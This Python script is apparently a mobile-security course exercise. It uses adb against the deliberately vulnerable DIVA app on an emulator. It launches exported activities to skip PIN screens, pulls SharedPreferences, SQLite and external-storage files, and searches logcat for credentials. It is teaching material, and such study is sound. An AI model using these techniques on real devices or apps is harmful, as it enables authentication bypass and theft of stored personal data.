#!/usr/bin/env python3
"""
Exercise 7.3 — ADB Exploitation: Exported Activities & Insecure Storage
=========================================================================
Uses Android Debug Bridge (adb) to interact with DIVA running on an
Android emulator, exploiting the access control and insecure storage
vulnerabilities identified statically in Exercises 7.1 and 7.2.

  Phase 1 — Device / emulator check
    Verify adb connectivity, get device info, confirm DIVA is installed.

  Phase 2 — Exported activity exploitation (DIVA challenges 9–11)
    Launch DIVA's access control activities directly without authentication,
    bypassing the app's PIN/password UI entirely.
    Maps to: MSTG-AUTH-1 / MASVS-AUTH-1

  Phase 3 — Insecure storage inspection (DIVA challenges 3–6)
    Pull files written by DIVA to on-device storage:
      SharedPreferences XML (challenge 3)
      SQLite database (challenge 4)
      External storage files (challenge 5)
      Temporary files (challenge 6)
    Maps to: MSTG-STORAGE-1/2/3/4

  Phase 4 — Logcat sensitive data (challenge 1)
    Capture logcat output while DIVA logs credentials to the system log.
    Maps to: MSTG-STORAGE-3

REAL-WORLD CONTEXT:
  adb is the standard Android debugging interface. Any Android device with
  USB debugging enabled (or any emulator) is accessible via adb. In a
  corporate environment, MDM (Mobile Device Management) policies enforce
  "USB debugging disabled" to prevent exactly this attack. On a rooted
  device or emulator, adb shell gives a root shell — equivalent to SSH
  with root access to the device filesystem. DIVA's insecure storage
  challenges demonstrate what data an attacker with adb access (a stolen
  unlocked phone, a rooted test device, or an emulator) can extract without
  even decompiling the APK.

Prerequisites:
  - Android Studio installed (provides the AVD emulator and adb)
  - An AVD running (recommended: Pixel 4 API 30 x86_64 without Google Play)
  - DIVA APK installed: adb install targets/diva-beta.apk
  - adb on PATH (add ~/Library/Android/sdk/platform-tools to PATH)

Run:
  python exercises/7.3-adb-exported-activities.py
"""

import os
import sys
import subprocess
import time
from pathlib import Path

DIVA_PACKAGE = "jakhar.aseem.diva"
PULL_DIR = Path("reports/7.3-pulled-data")

# DIVA exported activity class names (from jadx decompilation, Exercise 7.2)
EXPORTED_ACTIVITIES = {
    "Access Control 1 (no auth required)": f"{DIVA_PACKAGE}/.APICredsActivity",
    "Access Control 2 (PIN bypass)":       f"{DIVA_PACKAGE}/.APICreds2Activity",
    "Access Control 3 (key bypass)":       f"{DIVA_PACKAGE}/.AccessControl3Activity",
}

# ── ADB helpers ───────────────────────────────────────────────────────────────

def adb(*args, check=True, capture=True) -> subprocess.CompletedProcess:
    cmd = ["adb", *args]
    return subprocess.run(cmd, capture_output=capture, text=True,
                          timeout=30, check=check)

def adb_shell(cmd: str, **kwargs) -> str:
    result = adb("shell", cmd, **kwargs)
    return result.stdout.strip()

def check_adb_device() -> bool:
    """Verify adb is installed and a device/emulator is connected."""
    try:
        result = adb("devices")
        lines = result.stdout.strip().split('\n')
        devices = [l for l in lines[1:] if l.strip() and 'offline' not in l]
        if devices:
            print(f"  Device: {devices[0].split(chr(9))[0]}")
            return True
        print("""
[ERROR] No Android device/emulator found.

  Start an AVD emulator:
    1. Open Android Studio → Device Manager
    2. Create a Pixel 4 API 30 AVD (x86_64, WITHOUT Google Play store)
    3. Click the play button to launch the emulator
    4. Wait for the emulator to boot fully
    5. Verify: adb devices  (should show 'emulator-5554 device')

  Install DIVA after the emulator boots:
    adb install targets/diva-beta.apk
""")
        return False
    except FileNotFoundError:
        print("""
[ERROR] adb not found. Add Android platform-tools to your PATH:

  macOS / Linux:
    export PATH=$PATH:~/Library/Android/sdk/platform-tools
    # Add to ~/.zshrc or ~/.bashrc for persistence

  Verify: adb version
""")
        return False

def check_diva_installed() -> bool:
    """Check if DIVA is installed on the connected device."""
    result = adb_shell(f"pm list packages | grep {DIVA_PACKAGE}")
    if DIVA_PACKAGE in result:
        print(f"  DIVA installed ✅  ({DIVA_PACKAGE})")
        return True
    print(f"""
  [ERROR] DIVA not installed. Install it first:
    adb install targets/diva-beta.apk
""")
    return False

# ── Phase 2: Exported activity exploitation ───────────────────────────────────

def exploit_exported_activities():
    print("\n[Phase 2] Exported Activity Exploitation")
    print("─" * 60)
    print("  Launching DIVA's access control activities WITHOUT the app UI.")
    print("  A real app would require PIN/password to reach these screens.\n")

    for label, component in EXPORTED_ACTIVITIES.items():
        print(f"  Targeting: {label}")
        print(f"    Component: {component}")
        result = adb("shell", "am", "start", "-n", component, check=False)
        if result.returncode == 0 and "Error" not in result.stdout:
            print(f"    ✅ Activity launched successfully (check emulator screen)")
        else:
            err = (result.stdout + result.stderr).strip()[:100]
            print(f"    ⚠  {err}")
        time.sleep(1)

    print(f"""
  KEY FINDING (MSTG-AUTH-1 / MASVS-AUTH-1):
    All three access control activities launched without credentials.
    The app relies on UI flow for authentication — not permission checks.
    Any app on the device can send the same intent and bypass the gate.

    Real-world equivalent: a corporate app that protects a salary view
    behind a fingerprint prompt but exposes the salary Activity as exported.
    A malicious app on the same device bypasses the biometric entirely.
""")

# ── Phase 3: Insecure storage inspection ──────────────────────────────────────

def inspect_insecure_storage():
    print("[Phase 3] Insecure Storage Inspection")
    print("─" * 60)

    PULL_DIR.mkdir(parents=True, exist_ok=True)
    data_dir = f"/data/data/{DIVA_PACKAGE}"

    # Trigger challenges to write data (requires DIVA open + root on emulator)
    # On a non-rooted emulator we use run-as instead of su
    print("  Attempting file pulls via run-as (requires debuggable app)...")

    pulls = [
        (f"{data_dir}/shared_prefs/{DIVA_PACKAGE}_preferences.xml",
         "SharedPreferences (Challenge 3)",  "MSTG-STORAGE-1"),
        (f"{data_dir}/databases/ids",
         "SQLite database (Challenge 4)",    "MSTG-STORAGE-2"),
        (f"/sdcard/jakhar/aseem/diva/notes",
         "External storage notes (Ch.5)",    "MSTG-STORAGE-5"),
    ]

    for remote_path, label, masvs in pulls:
        local_path = PULL_DIR / Path(remote_path).name
        # First copy to accessible location using run-as
        tmp = f"/sdcard/tmp_{Path(remote_path).name}"
        adb_shell(f"run-as {DIVA_PACKAGE} cp {remote_path} {tmp} 2>/dev/null || true")
        result = adb("pull", tmp, str(local_path), check=False)
        if result.returncode == 0 and local_path.exists():
            content = local_path.read_text(errors="replace")[:200]
            print(f"\n  ✅ Pulled: {label} [{masvs}]")
            print(f"     {local_path}")
            if content.strip():
                print(f"     Content preview: {content[:150].strip()}")
        else:
            print(f"\n  ⚠  Could not pull: {label}")
            print(f"     → Run DIVA challenge {label.split('(')[1].rstrip(')')} first to write data,")
            print(f"       then re-run this exercise. Requires root/debuggable emulator.")

    print(f"""
  KEY FINDING (MSTG-STORAGE-1/2/3/4):
    DIVA writes credentials to SharedPreferences, SQLite, and external
    storage in plaintext. On any rooted device or AVD with adb access,
    these files are directly readable — no app code needs to execute.

    SharedPreferences are stored at: /data/data/<package>/shared_prefs/
    SQLite databases at:             /data/data/<package>/databases/
    External storage is world-readable (no permission needed to read).
""")

# ── Phase 4: Logcat capture ────────────────────────────────────────────────────

def capture_logcat():
    print("[Phase 4] Logcat — Sensitive Data in Logs")
    print("─" * 60)
    print(f"  Filtering logcat for {DIVA_PACKAGE} ...")
    print("  (Open DIVA → Insecure Logging challenge → enter credentials in the app)")
    print("  Capturing 5 seconds of logs...\n")

    result = subprocess.run(
        ["adb", "logcat", "-d", "-s", f"{DIVA_PACKAGE}:V"],
        capture_output=True, text=True, timeout=8, check=False
    )

    log_output = result.stdout or "(no log output — interact with DIVA first)"
    log_path = Path("reports/7.3-logcat.txt")
    log_path.write_text(log_output)

    sensitive_lines = [l for l in log_output.split('\n')
                       if any(kw in l.lower() for kw in
                              ['password', 'passwd', 'pin', 'key', 'token', 'secret', 'credit'])]

    if sensitive_lines:
        print("  ⚠  SENSITIVE DATA FOUND IN LOGS:")
        for line in sensitive_lines[:5]:
            print(f"    {line.strip()}")
    else:
        print("  No sensitive data found in log sample.")
        print("  → Open DIVA → Insecure Logging (Challenge 1)")
        print("  → Enter a credit card number, then re-run this phase.")

    print(f"""
  KEY FINDING (MSTG-STORAGE-3):
    Log output is readable by any app with READ_LOGS permission on
    Android < 4.1, and by adb on any USB-debugging-enabled device.
    Developers commonly use Log.d() for debugging and forget to strip
    it from release builds. Any value passed to Log.*() is permanently
    visible in the device log ring buffer.

  Log saved: {log_path}
""")

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    print("=" * 70)
    print("Exercise 7.3 — ADB: Exported Activities & Insecure Storage")
    print(f"Target: DIVA ({DIVA_PACKAGE})")
    print("=" * 70)
    print("\nPrerequisites: Android emulator running + DIVA installed")

    if not check_adb_device():
        sys.exit(1)

    device_info = adb_shell("getprop ro.build.version.release")
    sdk_info    = adb_shell("getprop ro.build.version.sdk")
    print(f"  Android {device_info}  (API {sdk_info})")

    if not check_diva_installed():
        sys.exit(1)

    exploit_exported_activities()
    inspect_insecure_storage()
    capture_logcat()

    print("=" * 70)
    print("Exercise 7.3 complete.")
    print("Next: Exercise 7.4 — Frida dynamic instrumentation")
    print("      (hook DIVA's storage writes and root detection in real time)")
    print("=" * 70)

if __name__ == "__main__":
    main()
